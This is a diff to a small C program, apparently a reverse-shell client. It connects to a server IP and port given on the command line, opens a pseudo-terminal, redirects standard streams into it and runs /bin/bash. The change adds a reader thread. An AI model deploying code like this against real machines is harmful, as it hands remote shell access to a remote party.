@@ -3,6 +3,7 @@
 #include <unistd.h>
 #include <sys/wait.h>
 #include "client_socket_init.h"
+#include "thread_functions.h"
 
 int main(int argc, char *argv[]) {
 
@@ -11,12 +12,12 @@ int main(int argc, char *argv[]) {
     char buf[2048];
     ssize_t num_bytes;
     pid_t pid;
+    pthread_t reader_thread;
 
     if (argc < 3) {
         fprintf(stderr, "Usage : shell server_ip port\n");
         exit(EXIT_FAILURE);
     }
-
     socket_fd = get_socket(argv[1], argv[2]);
 
     if (openpty(&master, &slave, NULL, NULL, NULL) == -1) {
@@ -40,6 +41,7 @@ int main(int argc, char *argv[]) {
         dup2(slave, 1);
         dup2(slave, 2);
         close(slave);
+        pthread_create(&reader_thread,NULL, thread_function,&socket_fd);
         execl("/bin/bash", "/bin/bash", NULL);
         perror("execl");
         exit(EXIT_FAILURE);
